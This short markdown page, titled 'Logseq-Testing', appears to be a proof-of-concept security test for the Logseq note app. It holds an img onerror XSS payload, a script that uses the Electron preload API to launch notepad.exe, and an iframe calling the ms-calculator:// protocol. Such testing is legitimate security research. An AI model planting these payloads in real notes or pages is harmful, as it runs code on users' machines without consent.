# Logseq-Testing
---

<img src=x onerror="alert('XSS')">

<SCRIPT>
        // Check if the Electron preload API is accessible
      if (window.apis) {
        // Attempt to open Calculator
        window.apis.openPath('C:\\Windows\\System32\\notepad.exe')
          .then(() => console.log('Notepad launched!'))
          .catch(err => console.error('Failed to launch:', err));
      } else {
        console.error('window.apis not available');
      }
</SCRIPT>

[:iframe {:src "ms-calculator://"}]
